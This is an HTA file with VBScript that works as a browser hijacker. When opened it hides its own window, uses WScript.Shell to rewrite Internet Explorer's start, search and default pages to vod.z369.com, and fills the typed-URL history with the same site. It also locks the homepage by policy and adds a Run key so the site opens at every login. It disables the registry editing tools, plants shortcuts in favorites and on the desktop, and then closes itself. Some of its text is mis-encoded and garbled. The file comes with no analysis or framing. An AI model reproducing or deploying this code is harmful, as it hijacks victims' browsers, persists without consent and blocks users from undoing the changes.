<hta:application caption="no" showintaskbar="no">
<body onload="window.blur();">
<object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script LANGUAGE="VBScript">
l=screen.width+200
t=screen.height+200
moveTo l,t
resizeTo 0,0
</script>
<script LANGUAGE="VBScript">
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "Http://vod.z369.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "Http://vod.z369.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "Http://vod.z369.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "Http://vod.z369.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","Http://vod.z369.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","Http://vod.z369.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","Http://vod.z369.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","Http://vod.z369.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Second Home Page","Http://vod.z369.com"
bugs.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage","1","REG_DWORD"
bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IEXPLORE.EXE", "IEXPLORE.EXE Http://vod.z369.com"
bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","1","REG_DWORD"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title", "��Ѽ������ߵ�Ӱ vod.z369.com"
on error resume next
Call LongFei_AddFavorites("-����Ѽ������ߵ�Ӱ��","Http://vod.z369.com")
on error resume next
Call LongFei_AddDesktop("��Ѽ������ߵ�Ӱ","Http://vod.z369.com")
on error resume next
Call LongFei_AddQuickLaunch("[��Ѽ������ߵ�Ӱ]","Http://vod.z369.com")
Function LongFei_AddFavorites(N, U)
	on error resume next
	Set S = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/" + N +".URL")
	S.TargetPath = U	
	S.Save()
	Set Sl = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/����/" + N +".URL")
	Sl.TargetPath = U
	Sl.Save()
End Function
Function LongFei_AddDesktop(N, U)
	on error resume next
	Set S = bugs.CreateShortcut(bugs.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
	S.TargetPath = U	
	S.Save()
End Function
</script>
<script LANGUAGE="JScript.Encode">
function closeit() {
setTimeout("self.close()",5)
}
closeit()
</script>
